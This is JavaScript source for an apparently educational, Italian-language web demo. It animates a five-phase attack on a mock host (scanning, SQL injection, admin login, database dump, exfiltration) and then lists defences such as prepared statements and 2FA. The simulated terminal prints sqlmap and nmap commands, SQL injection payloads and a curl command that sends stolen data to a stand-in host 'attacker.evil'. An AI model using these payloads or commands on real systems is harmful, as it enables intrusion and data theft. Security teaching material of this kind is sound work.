const ExfiltrationDemo = {
  terminal: null,
  running: false,

  init(container) {
    container.insertAdjacentHTML('beforeend', `
      <div class="exfil-controls">
        <button class="btn btn-danger" id="exfil-start">Avvia Simulazione Attacco</button>
        <button class="btn btn-outline" id="exfil-pause" disabled>Pausa</button>
        <button class="btn btn-outline" id="exfil-reset">Reset</button>
        <span class="exfil-phase" id="exfil-phase">In attesa</span>
      </div>
      <div class="exfil-layout">
        <div class="exfil-panel exfil-attacker">
          <div class="exfil-panel-header">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            Terminale Attaccante
          </div>
          <div class="exfil-panel-body terminal" id="exfil-terminal"></div>
        </div>
        <div class="exfil-panel exfil-victim">
          <div class="exfil-panel-header">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
            Sistema Vittima - target.local
          </div>
          <div class="exfil-panel-body" id="exfil-victim-view" style="background:#F8F9FA;">
            <div style="text-align:center;padding:40px;color:#9CA3AF;">
              <svg viewBox="0 0 24 24" width="48" height="48" fill="none" stroke="currentColor" stroke-width="1.5" style="margin-bottom:12px;"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
              <p>Il sistema vittima apparira' qui durante la simulazione</p>
            </div>
          </div>
        </div>
      </div>
      <div id="exfil-c2" style="display:none;"></div>
      <div id="exfil-defenses" style="display:none;margin-top:24px;">
        <h3 style="text-align:center;margin-bottom:20px;">Come si poteva prevenire?</h3>
        <div class="defense-grid" id="exfil-defense-grid"></div>
      </div>
    `);

    const termEl = container.querySelector('#exfil-terminal');
    this.terminal = new TerminalEngine(termEl);

    container.querySelector('#exfil-start').addEventListener('click', () => this._run(container));
    container.querySelector('#exfil-pause').addEventListener('click', () => {
      const btn = container.querySelector('#exfil-pause');
      if (this.terminal.paused) {
        this.terminal.resume();
        btn.textContent = 'Pausa';
      } else {
        this.terminal.pause();
        btn.textContent = 'Riprendi';
      }
    });
    container.querySelector('#exfil-reset').addEventListener('click', () => {
      this.terminal.abort();
      this.running = false;
      this.terminal.reset();
      container.querySelector('#exfil-phase').textContent = 'In attesa';
      container.querySelector('#exfil-victim-view').innerHTML = '<div style="text-align:center;padding:40px;color:#9CA3AF;"><p>Il sistema vittima apparira\' qui durante la simulazione</p></div>';
      container.querySelector('#exfil-c2').style.display = 'none';
      container.querySelector('#exfil-defenses').style.display = 'none';
      container.querySelector('#exfil-start').disabled = false;
      container.querySelector('#exfil-pause').disabled = true;
      fetch('/api/reset-db');
    });
  },

  async _run(container) {
    if (this.running) return;
    this.running = true;
    this.terminal.reset();
    container.querySelector('#exfil-start').disabled = true;
    container.querySelector('#exfil-pause').disabled = false;

    const t = this.terminal;
    const phase = (text) => { container.querySelector('#exfil-phase').textContent = text; };
    const victim = container.querySelector('#exfil-victim-view');

    try {
      // FASE 1: Ricognizione
      phase('Fase 1/5 - Ricognizione');
      t.printLine('[*] Inizio ricognizione su target.local', 'section');
      await t.typeLine('nmap -sV -p 1-1000 target.local', 'command', 25);
      await this._sleep(500);
      await t.printLines([
        'Starting Nmap 7.94 ( https://nmap.org )',
        'Nmap scan report for target.local (192.168.1.100)',
        'PORT     STATE SERVICE  VERSION',
        '22/tcp   open  ssh      OpenSSH 8.9',
        '80/tcp   open  http     Node.js Express',
        '443/tcp  open  https    Node.js Express',
        '3306/tcp open  mysql    SQLite 3.x',
      ], 'output', 80);
      t.printLine('[+] 4 porte aperte trovate', 'success');
      await this._sleep(400);

      await t.typeLine('dirb http://target.local/', 'command', 25);
      await this._sleep(300);
      await t.printLines([
        'DIRB v2.22 - Web Content Scanner',
        '---- Scanning URL: http://target.local/ ----',
        '==> FOUND: /login (200)',
        '==> FOUND: /admin (401)',
        '==> FOUND: /api/search (200)',
        '==> FOUND: /api/users (403)',
      ], 'output', 60);
      t.printLine('[+] Endpoint interessanti trovati: /login, /admin, /api/search', 'success');

      victim.innerHTML = `
        <div style="padding:20px;">
          <div style="background:var(--primary);color:white;padding:12px 20px;border-radius:8px 8px 0 0;font-weight:700;">target.local - Portale Aziendale</div>
          <div style="background:white;padding:20px;border:1px solid #E5E7EB;border-radius:0 0 8px 8px;">
            <div style="background:#E0EDFF;padding:8px 12px;border-radius:4px;font-size:13px;color:var(--primary);">Barra di ricerca: <input type="text" value="" style="border:1px solid #ccc;padding:4px 8px;border-radius:4px;width:200px;" readonly></div>
            <div style="margin-top:16px;font-size:14px;color:#6B7280;">Prodotti disponibili: 5 risultati</div>
          </div>
        </div>`;

      // FASE 2: SQL Injection
      phase('Fase 2/5 - SQL Injection');
      t.printLine('', 'output');
      t.printLine('[*] Fase 2: Tentativo SQL Injection su /api/search', 'section');
      await t.typeLine('sqlmap -u "http://target.local/api/search?q=test" --dump', 'command', 20);
      await this._sleep(400);
      await t.printLines([
        '[INFO] testing connection to the target URL',
        '[INFO] testing if the target URL is stable',
        "[INFO] target URL appears to be stable",
        "[INFO] testing 'AND boolean-based blind'",
        "[INFO] GET parameter 'q' appears to be injectable",
        '[INFO] fetching database tables...',
        '[INFO] fetching entries for table: users',
      ], 'output', 100);

      const step1Resp = await fetch('/api/exfil/step1-sqli', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: "' OR 1=1 --" })
      });
      const step1 = await step1Resp.json();

      t.printLine('', 'output');
      t.printLine('Database: main', 'info');
      t.printLine('Table: users', 'info');
      t.printTable(
        ['id', 'username', 'password', 'role', 'email'],
        step1.data.map(u => [u.id, u.username, u.password, u.role, u.email]),
        step1.data.findIndex(u => u.role === 'admin')
      );
      t.printLine(`[+] Admin trovato: ${step1.adminFound.username} : ${step1.adminFound.password}`, 'highlight');

      victim.innerHTML = `
        <div style="padding:20px;">
          <div style="background:var(--primary);color:white;padding:12px 20px;border-radius:8px 8px 0 0;font-weight:700;">target.local - Ricerca</div>
          <div style="background:white;padding:20px;border:1px solid #E5E7EB;border-radius:0 0 8px 8px;">
            <div style="background:#FEE2E2;padding:8px 12px;border-radius:4px;font-size:13px;color:var(--red);font-family:var(--font-mono);">q=' UNION SELECT id,username,password,role,email FROM users --</div>
            <div style="margin-top:12px;font-size:13px;">
              ${step1.data.map(u => `<div style="padding:4px 0;border-bottom:1px solid #f3f4f6;${u.role === 'admin' ? 'color:var(--red);font-weight:700;' : ''}">${u.username} | ${u.password} | ${u.role}</div>`).join('')}
            </div>
          </div>
        </div>`;

      await this._sleep(800);

      // FASE 3: Admin Access
      phase('Fase 3/5 - Accesso Admin');
      t.printLine('', 'output');
      t.printLine('[*] Fase 3: Accesso al pannello admin con credenziali rubate', 'section');
      await t.typeLine(`curl -X POST target.local/login -d "user=${step1.adminFound.username}&pass=${step1.adminFound.password}"`, 'command', 20);
      await this._sleep(300);

      const step2Resp = await fetch('/api/exfil/step2-admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: step1.adminFound.username, password: step1.adminFound.password })
      });
      const step2 = await step2Resp.json();

      await t.printLines([
        `[+] Login riuscito come: ${step2.user.username} (${step2.user.role})`,
        `[+] Session token: ${step2.token}`,
        '[+] Accesso al pannello di amministrazione ottenuto',
      ], 'success', 100);

      victim.innerHTML = `
        <div style="padding:20px;">
          <div style="background:#7F1D1D;color:#FCA5A5;padding:12px 20px;border-radius:8px 8px 0 0;font-weight:700;">target.local/admin - Pannello Admin</div>
          <div style="background:white;padding:20px;border:1px solid #E5E7EB;border-radius:0 0 8px 8px;">
            <p style="font-size:14px;color:var(--red);">Benvenuto, admin</p>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
              <div style="background:#FEF2F2;padding:12px;border-radius:8px;font-size:13px;border:1px solid #FCA5A5;">Gestione Utenti</div>
              <div style="background:#FEF2F2;padding:12px;border-radius:8px;font-size:13px;border:2px solid var(--red);font-weight:700;">Database Manager</div>
              <div style="background:#FEF2F2;padding:12px;border-radius:8px;font-size:13px;border:1px solid #FCA5A5;">Configurazione</div>
              <div style="background:#FEF2F2;padding:12px;border-radius:8px;font-size:13px;border:1px solid #FCA5A5;">Logs Sistema</div>
            </div>
          </div>
        </div>`;

      await this._sleep(800);

      // FASE 4: Database Dump
      phase('Fase 4/5 - Database Dump');
      t.printLine('', 'output');
      t.printLine('[*] Fase 4: Scaricamento dati sensibili dal database', 'section');
      await t.typeLine(`curl -H "Authorization: Bearer ${step2.token}" target.local/api/exfil/dump`, 'command', 18);
      await this._sleep(300);

      const step3Resp = await fetch('/api/exfil/step3-dump', {
        headers: { 'Authorization': `Bearer ${step2.token}` }
      });
      const step3 = await step3Resp.json();

      t.printLine(`[+] ${step3.recordCount} record estratti da ${step3.tableCount} tabelle`, 'success');
      t.printLine('', 'output');
      t.printLine('Tabella: secrets', 'info');
      t.printTable(
        ['id', 'tipo', 'valore', 'proprietario'],
        step3.secrets.map(s => [s.id, s.data_type, s.value, s.belongs_to]),
        -1
      );

      victim.innerHTML = `
        <div style="padding:20px;">
          <div style="background:#7F1D1D;color:#FCA5A5;padding:12px 20px;border-radius:8px 8px 0 0;font-weight:700;">target.local/admin - Database Manager</div>
          <div style="background:white;padding:20px;border:1px solid #E5E7EB;border-radius:0 0 8px 8px;">
            <p style="font-size:13px;color:var(--red);font-weight:700;">DUMP IN CORSO...</p>
            <div style="margin-top:8px;font-family:var(--font-mono);font-size:12px;">
              ${step3.secrets.map(s => `<div style="padding:4px 0;border-bottom:1px solid #f3f4f6;color:var(--red);">${s.data_type}: ${s.value}</div>`).join('')}
            </div>
          </div>
        </div>`;

      await this._sleep(800);

      // FASE 5: Exfiltrazione
      phase('Fase 5/5 - Exfiltrazione');
      t.printLine('', 'output');
      t.printLine('[*] Fase 5: Invio dati al server C2', 'section');
      await t.typeLine('curl -X POST https://attacker.evil:8443/receive -d @stolen_data.json', 'command', 18);

      const step4Resp = await fetch('/api/exfil/step4-exfil', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: step3.secrets })
      });
      const step4 = await step4Resp.json();

      await t.showProgress('Exfiltrating', 2500, 25);
      t.printLine('', 'output');
      t.printLine(`[+] Exfiltration completa. ${step4.recordsStolen} record inviati (${step4.dataSize})`, 'highlight');
      t.printLine(`[+] Destinazione: ${step4.exfiltratedTo}`, 'success');
      t.printLine(`[+] Timestamp: ${step4.timestamp}`, 'output');

      // Mostra pannello C2
      const c2El = container.querySelector('#exfil-c2');
      c2El.style.display = 'block';
      c2El.innerHTML = `
        <div class="exfil-c2-panel">
          <div class="exfil-c2-header">SERVER C2 - attacker.evil:8443 - Dati Ricevuti</div>
          <div class="exfil-c2-body">
            <div>[${step4.timestamp}] Connessione ricevuta da target.local</div>
            <div>[${step4.timestamp}] Payload: ${step4.dataSize}</div>
            <div>[${step4.timestamp}] Record ricevuti: ${step4.recordsStolen}</div>
            <div style="margin-top:8px;">--- DATI RUBATI ---</div>
            ${step3.secrets.map(s => `<div style="color:#FCA5A5;">${s.data_type}: ${s.value} (${s.belongs_to})</div>`).join('')}
            <div style="margin-top:8px;color:#6EE7B7;">[+] Exfiltrazione completata con successo</div>
          </div>
        </div>`;

      victim.innerHTML = `
        <div style="padding:20px;text-align:center;">
          <svg viewBox="0 0 24 24" width="64" height="64" fill="none" stroke="var(--red)" stroke-width="1.5" style="margin-bottom:16px;">
            <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
            <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
          </svg>
          <h3 style="color:var(--red);">SISTEMA COMPROMESSO</h3>
          <p style="color:#6B7280;font-size:14px;">L'attaccante ha estratto tutti i dati sensibili senza che il sistema generasse alcun allarme.</p>
        </div>`;

      await this._sleep(1500);

      // FASE 6: Difese
      phase('Reveal - Come prevenire');
      this._showDefenses(container, step3);

    } catch (err) {
      if (err.message === 'aborted') return;
      console.error(err);
      t.printLine(`[ERROR] ${err.message}`, 'error');
    }

    this.running = false;
    container.querySelector('#exfil-start').disabled = false;
    container.querySelector('#exfil-pause').disabled = true;
  },

  _showDefenses(container) {
    const defensesEl = container.querySelector('#exfil-defenses');
    defensesEl.style.display = 'block';

    const defenses = [
      { title: 'Prepared Statements', desc: 'Blocca la Fase 2: l\'injection SQL non sarebbe possibile con query parametrizzate.', phase: 'Blocca Fase 2' },
      { title: 'Password Hashing + Salting', desc: 'Anche con un dump, le password sarebbero illeggibili (bcrypt, argon2).', phase: 'Mitiga Fase 2' },
      { title: 'Autenticazione a Due Fattori (2FA)', desc: 'Blocca la Fase 3: le credenziali rubate non bastano senza il secondo fattore.', phase: 'Blocca Fase 3' },
      { title: 'Crittografia dei Dati a Riposo', desc: 'Fase 4 inutile: i dati nel DB sarebbero cifrati e illeggibili.', phase: 'Mitiga Fase 4' },
      { title: 'Network Monitoring / IDS', desc: 'Fase 5 rilevata: un IDS avrebbe segnalato il traffico anomalo in uscita.', phase: 'Rileva Fase 5' },
      { title: 'Principio del Minimo Privilegio', desc: 'L\'account admin non dovrebbe avere accesso diretto al dump del database.', phase: 'Mitiga Fase 4' },
    ];

    const grid = container.querySelector('#exfil-defense-grid');
    grid.innerHTML = defenses.map((d, i) => `
      <div class="defense-item" data-index="${i}">
        <div class="defense-check">
          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="3" style="display:none;"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <div>
          <h4>${d.title}</h4>
          <p>${d.desc}</p>
          <span class="badge badge-primary" style="margin-top:4px;">${d.phase}</span>
        </div>
      </div>
    `).join('');

    grid.querySelectorAll('.defense-item').forEach(item => {
      item.addEventListener('click', () => {
        item.classList.toggle('patched');
        const svg = item.querySelector('svg');
        svg.style.display = item.classList.contains('patched') ? 'block' : 'none';
      });
    });
  },

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
};

window.ExfiltrationDemo = ExfiltrationDemo;
